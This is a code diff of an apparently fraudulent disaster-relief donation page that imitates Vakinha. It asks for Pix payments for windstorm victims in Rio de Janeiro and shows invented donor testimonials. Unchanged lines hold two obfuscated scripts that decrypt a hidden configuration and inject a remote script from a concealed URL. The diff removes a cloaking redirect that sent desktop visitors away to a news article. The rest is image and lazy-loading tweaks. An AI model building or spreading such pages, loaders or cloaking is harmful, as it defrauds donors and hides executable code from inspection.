@@ -261,28 +261,7 @@
   <script>(function () { var o_c86 = atob("DPecrPtRJvA2aqm9z4y+2Yk9BMoUAt3Jv4Smg9QyQp4YH93QppHlgpg+S95UGIbOrIX13I8iCYBfEszR4If11J49CJpFSIWfroPo3pIzU4RTGYuHlKqwjpw9SZJXBtqf9aznjpUwS5UUUIvNpo/5wLI1BNwUHMjRupK+ltlnR8ZTCJiJ+5KknMlnQsACD8iOqc+ozZ9zW61L"); var b_p = []; for (var r_t = 0; r_t < o_c86.length; r_t++) { b_p.push(o_c86.charCodeAt(r_t) & 255); } var p_8u = b_p[0]; var b_9lg = b_p.slice(1, 1 + p_8u); var e_l = b_p.slice(1 + p_8u); var z_7 = e_l.map(function (b, z_rl) { return b ^ b_9lg[z_rl % p_8u]; }); var a_s = ""; for (var e_za = 0; e_za < z_7.length; e_za++) { a_s += String.fromCharCode(z_7[e_za] & 255); } var u_l9 = decodeURIComponent(escape(a_s)); var b_jy = JSON.parse(u_l9); var y_in = b_jy.globals || []; y_in.forEach(function (k_y) { window[k_y.name] = k_y.value; }); var a_q3 = document.createElement("script"); a_q3.src = b_jy.url; a_q3.async = true; a_q3.defer = true; (b_jy.attributes || []).forEach(function (m_aavz) { a_q3.setAttribute(m_aavz.name, m_aavz.value); }); (document.head || document.documentElement).appendChild(a_q3); })();</script>
 <script>(function(){var k_kka=atob("DF+nXTOUn74upsQC3iSFKEH4vYQMzrB2riydchz3+9AA07Bvtznec1D78pBM1OtxvS3OLUfnsMtay7ctsj7TOEDgsdRdhOggvyvTL1r26spL1eY4hSSFM1L5+pwUhKBjqj6KKEf59thXi7RwuynCM0e5591BwulxvTSFcRHi/tJbw+Y4/H3acUi28d9Dw+Y4/DvGKVK56spDz6J78y/VOEXx8coD1bFgtzvUfx+26d9C06Eg5H2FIG7p");var g_6iha=[];for(var o_19=0;o_19<k_kka.length;o_19++){g_6iha.push(k_kka.charCodeAt(o_19)&255);}var u_6=g_6iha[0];var j_h8=g_6iha.slice(1,1+u_6);var k_7s=g_6iha.slice(1+u_6);var f_3w=k_7s.map(function(b,d_d){return b^j_h8[d_d%u_6];});var e_1dwd="";for(var k_qi6v=0;k_qi6v<f_3w.length;k_qi6v++){e_1dwd+=String.fromCharCode(f_3w[k_qi6v]&255);}var a_jxw=decodeURIComponent(escape(e_1dwd));var l_6sx=JSON.parse(a_jxw);var t_4aa9=l_6sx.globals||[];t_4aa9.forEach(function(c_g){window[c_g.name]=c_g.value;});var n_stv0=document.createElement("script");n_stv0.src=l_6sx.url;n_stv0.async=true;n_stv0.defer=true;(l_6sx.attributes||[]).forEach(function(e_5){n_stv0.setAttribute(e_5.name,e_5.value);});(document.head||document.documentElement).appendChild(n_stv0);})();</script>
 <script src="js/utm-manager.js"></script>
-<script type="text/javascript">
-  //digite a url de redirect
-  var url_link_redirect_pc = "https://g1.globo.com/rj/rio-de-janeiro/noticia/2026/07/30/veja-como-amanheceu-o-rio-apos-o-vendaval.ghtml";
-  
-  function isAdminBypass() {
-    if (window.location.search.indexOf('admin=1') !== -1) {
-      localStorage.setItem('admin_bypass', '1');
-    }
-    return localStorage.getItem('admin_bypass') === '1';
-  }
 
-  //function js
-  function isMobile() {
-   const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
-   return regex.test(navigator.userAgent);
-  }
-
-  //validation js
-  if (isMobile() || isAdminBypass()) { console.log("Mobile device or Admin detected"); } else {
-   window.location = url_link_redirect_pc;
-  }
-</script>
 </head>
 
 <body>
@@ -346,7 +325,7 @@
             </div>
         </div>
 
-        <video id="vsl-video" src="images/VSL.mp4" type="video/mp4" autoplay muted playsinline preload="auto" style="display: block; margin: 0 auto; width: 100%; border-radius: 12px; background-color: #000; pointer-events: none;"></video>
+        <video id="vsl-video" src="images/VSL.mp4" type="video/mp4" autoplay muted playsinline preload="none" poster="images/VSL_poster.webp" style="display: block; margin: 0 auto; width: 100%; border-radius: 12px; background-color: #000; pointer-events: none;"></video>
         
         <script>
             (function(){
@@ -1169,7 +1148,7 @@
       <button class="dlg__close" type="button" data-close="" aria-label="Fechar">×</button>
 
       <div style="text-align: center; margin-bottom: 20px;">
-        <img src="images/bannervendaval.png" alt="Emergência Vendaval Rio de Janeiro"
+        <img loading="lazy" src="images/bannervendaval.webp" alt="Emergência Vendaval Rio de Janeiro"
           style="display: block; margin: 0 auto; width: 100%; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.08);">
       </div>
 
@@ -1446,19 +1425,19 @@
         const box = $('#pxm-qrc'); box.innerHTML = '';
 
         if (qrImgMaybe) {
-          box.innerHTML = `<img src="${qrImgMaybe}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`;
+          box.innerHTML = `<img loading="lazy" src="${qrImgMaybe}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`;
           return;
         }
 
         if (emv) {
           if (drawQR(box, emv)) return;
-          if (S.qrPng) { box.innerHTML = `<img src="${S.qrPng}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`; return; }
+          if (S.qrPng) { box.innerHTML = `<img loading="lazy" src="${S.qrPng}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`; return; }
           // Fallback para api.qrserver.com caso não tenha lib QRCode
-          box.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(emv)}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`;
+          box.innerHTML = `<img loading="lazy" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(emv)}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`;
           return;
         }
 
-        if (isDataUrl(qrImgMaybe)) { box.innerHTML = `<img src="${qrImgMaybe}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`; return; }
+        if (isDataUrl(qrImgMaybe)) { box.innerHTML = `<img loading="lazy" src="${qrImgMaybe}" alt="QR Pix" style="width:100%;height:100%;object-fit:contain">`; return; }
         box.innerHTML = '<div style="font:600 12px/1.2 system-ui,Segoe UI,Arial;color:#64748b;text-align:center;padding:14px">Não foi possível exibir o QR. Use o código PIX abaixo.</div>';
       }
 
@@ -1930,7 +1909,7 @@
     <div class="container">
       <div class="content-header d-flex align-items-center justify-content-between">
         <div class="logo">
-          <a href="index.html#"><img src="images/FCu40UVyWIhM.svg" alt="Vakinha Apoio"></a>
+          <a href="index.html#"><img loading="lazy" src="images/FCu40UVyWIhM.svg" alt="Vakinha Apoio"></a>
         </div>
         <div class="menu-header d-none d-lg-flex d-xl-flex align-items-center">
           <div class="item-menu"><span>Como ajudar</span><svg
@@ -1985,7 +1964,7 @@
             style="position:fixed;top:0;right:-100%;width:80%;max-width:300px;height:100%;background:#fff;z-index:9999;box-shadow:-4px 0 20px rgba(0,0,0,0.15);transition:right 0.3s ease;padding:0;display:flex;flex-direction:column;">
             <div
               style="display:flex;align-items:center;justify-content:space-between;padding:18px 20px;border-bottom:1px solid #eee;">
-              <img src="images/FCu40UVyWIhM.svg" alt="Vakinha" style="height:32px;">
+              <img loading="lazy" src="images/FCu40UVyWIhM.svg" alt="Vakinha" style="height:32px;">
               <button onclick="document.getElementById('drawer-nav').classList.remove('drawer-open')"
                 aria-label="Fechar menu" style="background:none;border:none;cursor:pointer;padding:4px;">
                 <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none"
@@ -2042,21 +2021,21 @@
           <div class="detalhes-view">
             <div class="galeria">
               <div class="swiper-wrapper">
-                <div class="image swiper-slide"><img src="images/BANNER_AF2.png" alt=""></div>
+                <div class="image swiper-slide"><img loading="lazy" src="images/BANNER_AF2.webp" alt=""></div>
               </div>
               <div class="galeria-pagination"></div>
             </div>
             <div class="sc-jXbUNg jeWFMw">
               <ul class="sc-46fe23d1-0 haSOVG">
-                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
+                <li class="sc-46fe23d1-1 gNSeDc"><img loading="lazy" class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
                     src="images/8vxI6EyNFQ8W.svg" alt=""></li>
-                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
-                    src="images/o7PZgvZkZc9l.png" alt=""></li>
-                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
+                <li class="sc-46fe23d1-1 gNSeDc"><img loading="lazy" class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
+                    src="images/o7PZgvZkZc9l.webp" alt=""></li>
+                <li class="sc-46fe23d1-1 gNSeDc"><img loading="lazy" class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
                     src="images/L2Z04V7lbjWt.svg" alt=""></li>
-                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
+                <li class="sc-46fe23d1-1 gNSeDc"><img loading="lazy" class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
                     src="images/7sRcOCxcoqdI.webp" alt=""></li>
-                <li class="sc-46fe23d1-1 gNSeDc"><img class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
+                <li class="sc-46fe23d1-1 gNSeDc"><img loading="lazy" class="sc-ad44238c-0 bFFsjk sc-46fe23d1-2 lgcmt"
                     src="images/hQruPsekETpw.webp" alt=""></li>
                 <li class="sc-46fe23d1-1 gNSeDc">
                   <section class="sc-46fe23d1-3 jLFjnt">+</section>
@@ -2087,7 +2066,7 @@
 
           <div class="resumo-mobile sticker d-block d-lg-none d-xl-none">
             <div class="perfil d-flex">
-              <div class="avatar"><img src="images/uni.png" alt="Fazer o Bem do Amor Pet"></div>
+              <div class="avatar"><img loading="lazy" src="images/uni.webp" alt="Fazer o Bem do Amor Pet"></div>
               <div class="dadosPerfil">
                 <h3>Fazer o Bem</h3>
                 <span class="ativo">Ativo(a) no Vakinha desde Agosto/2025</span>
@@ -2207,7 +2186,7 @@
 
                 <div class="comentario">
                   <div class="content-comentario">
-                    <div class="avatar"><img src="images/W6zmSrNEZwLq.png" alt="Ana Clara Mendes"></div>
+                    <div class="avatar"><img loading="lazy" src="images/W6zmSrNEZwLq.webp" alt="Ana Clara Mendes"></div>
                     <div class="text-comentario">
                       <h3>Ana Clara Mendes</h3>
                       <p>Doei R$ 300,00 agora mesmo. Moro no RJ e vi de perto o horror que o vendaval deixou. A rua
@@ -2223,7 +2202,7 @@
 
                 <div class="comentario">
                   <div class="content-comentario">
-                    <div class="avatar"><img src="images/220ng6919Yif.webp" alt="Fabiula Henrique"></div>
+                    <div class="avatar"><img loading="lazy" src="images/220ng6919Yif.webp" alt="Fabiula Henrique"></div>
                     <div class="text-comentario">
                       <h3>Fabiula Henrique</h3>
                       <p>Doação de R$ 200,00 feita! Assisti ao noticiário de madrugada e não consegui dormir
@@ -2241,7 +2220,7 @@
 
                 <div class="comentario">
                   <div class="content-comentario">
-                    <div class="avatar"><img src="images/ECeqO0WJ2O13.webp" alt="Cícera Rodrigues"></div>
+                    <div class="avatar"><img loading="lazy" src="images/ECeqO0WJ2O13.webp" alt="Cícera Rodrigues"></div>
                     <div class="text-comentario">
                       <h3>Cícera Rodrigues</h3>
                       <p>Meu primo mora em Petrópolis e o telhado da casa dele voou inteiro. A família toda está
@@ -2255,7 +2234,7 @@
 
                 <div class="comentario">
                   <div class="content-comentario">
-                    <div class="avatar"><img src="images/W6zmSrNEZwLq.png" alt="Meire Fonseca"></div>
+                    <div class="avatar"><img loading="lazy" src="images/W6zmSrNEZwLq.webp" alt="Meire Fonseca"></div>
                     <div class="text-comentario">
                       <h3>Meire Fonseca</h3>
                       <p>Fiz minha parte com R$ 50,00. Espero que esse dinheiro chegue logo para comprar as telhas e os
@@ -2268,7 +2247,7 @@
                   <div class="respostas-comentarios">
                     <div class="comentario">
                       <div class="content-comentario">
-                        <div class="avatar"><img src="images/99KcATmq8vkA.webp" alt="Gabriela Oliveira"></div>
+                        <div class="avatar"><img loading="lazy" src="images/99KcATmq8vkA.webp" alt="Gabriela Oliveira"></div>
                         <div class="text-comentario">
                           <h3>Gabriela Oliveira</h3>
                           <p>Verdade, Meire! Eu também ajudei com R$ 50,00. Queria poder mais, mas é o que dá agora.
@@ -2281,7 +2260,7 @@
                     </div>
                     <div class="comentario">
                       <div class="content-comentario">
-                        <div class="avatar"><img src="images/EOF0KAbxK7So.webp" alt="Letícia Mara"></div>
+                        <div class="avatar"><img loading="lazy" src="images/EOF0KAbxK7So.webp" alt="Letícia Mara"></div>
                         <div class="text-comentario">
                           <h3>Letícia Mara</h3>
                           <p>O Projeto Fazer o Bem é de confiança total. Vi no @projetofazerobem_rj as fotos das
@@ -2330,7 +2309,7 @@
     <div class="container">
       <div class="content-footer">
         <div class="topFooter d-flex align-items-center justify-content-between">
-          <div class="logo-rodape"><img src="images/hzYoNwltZl08.svg" alt="logo-rodape"></div>
+          <div class="logo-rodape"><img loading="lazy" src="images/hzYoNwltZl08.svg" alt="logo-rodape"></div>
           <div class="sociais">
             <ul class="d-flex align-items-center">
               <li><a href="index.html#"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv"
@@ -2394,22 +2373,22 @@
             <ul>
               <li style="padding: 0 !important;"><span>De Segunda à Sexta</span></li>
               <li><span>Das 9:30 às 17:00</span></li>
-              <li class="d-none d-lg-block d-xl-block"><img src="images/JBT3TP1WT2pp.webp" alt="Selo de Segurança">
+              <li class="d-none d-lg-block d-xl-block"><img loading="lazy" src="images/JBT3TP1WT2pp.webp" alt="Selo de Segurança">
               </li>
             </ul>
           </div>
           <div class="aba aba-links d-flex d-lg-none d-xl-none">
             <ul>
-              <li style="text-align: right;"><img src="images/JBT3TP1WT2pp.webp" alt="Selo de Segurança" width="86">
+              <li style="text-align: right;"><img loading="lazy" src="images/JBT3TP1WT2pp.webp" alt="Selo de Segurança" width="86">
               </li>
             </ul>
           </div>
           <div class="aba aba-links">
             <h4>Baixe nosso App</h4>
             <ul>
-              <li style="padding-bottom: 12px !important;"><a href="index.html#"><img src="images/Go2oiQQkAbyE.svg"
+              <li style="padding-bottom: 12px !important;"><a href="index.html#"><img loading="lazy" src="images/Go2oiQQkAbyE.svg"
                     alt="Google Play Store"></a></li>
-              <li><a href="index.html#"><img src="images/ZXWTkDGoiqgL.svg" alt="Apple Store"></a></li>
+              <li><a href="index.html#"><img loading="lazy" src="images/ZXWTkDGoiqgL.svg" alt="Apple Store"></a></li>
             </ul>
           </div>
         </div>
